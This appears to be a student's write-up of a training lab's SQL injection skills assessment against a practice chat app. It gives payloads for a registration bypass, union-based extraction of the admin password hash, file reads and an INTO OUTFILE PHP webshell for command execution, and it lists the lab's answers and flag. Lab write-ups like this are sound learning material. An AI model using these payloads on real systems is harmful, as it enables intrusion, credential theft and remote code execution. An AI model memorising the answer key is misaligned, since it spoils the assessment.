# Module 33 — SQL Injection Fundamentals
## Section: Skills Assessment (17/17, target: "chattr" chat app)

### Step 1 — Registration bypass
The invite-only registration form's invitation-code field is itself injectable:
```
invitationCode=x' OR '1'='1
```
This creates an account without a valid invite code.

### Step 2 — Find the injection point
Chat search feature: `GET /index.php?u=<id>&q=<search>`
A single `'` in `q` causes an HTTP 500 → confirms SQLi.
The underlying query needed a closing `)` before the injection:
```
q=xyz') UNION SELECT ...-- -
```
Column count = 4 (found via `ORDER BY`/`UNION SELECT NULL,...` trial). Columns 3 and 4 are reflected in the response.

### Q1 — Admin password hash
```sql
xyz') UNION SELECT 1,2,Password,4 FROM Users WHERE Username=0x61646d696e-- -
```
(`0x61646d696e` = hex for `admin`, used to dodge quote-filtering)

**Answer:** `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`

### Q2 — Web root path
```sql
xyz') UNION SELECT 1,2,LOAD_FILE('/etc/nginx/sites-available/default'),4-- -
```
**Answer:** `/var/www/chattr-prod`

### Q3 — RCE + flag
Used `INTO OUTFILE` to write a PHP webshell into the web root:
```sql
xyz') UNION SELECT 1,2,'<?php system($_GET[0]); ?>',4 INTO OUTFILE '/var/www/chattr-prod/sh.php'-- -
```
Then hit `sh.php?0=cat+/path/to/flag` as `www-data` to read the flag.

**Answer (flag/hash):** `061b1aeb94dec6bf5d9c27032b3c1d8d`
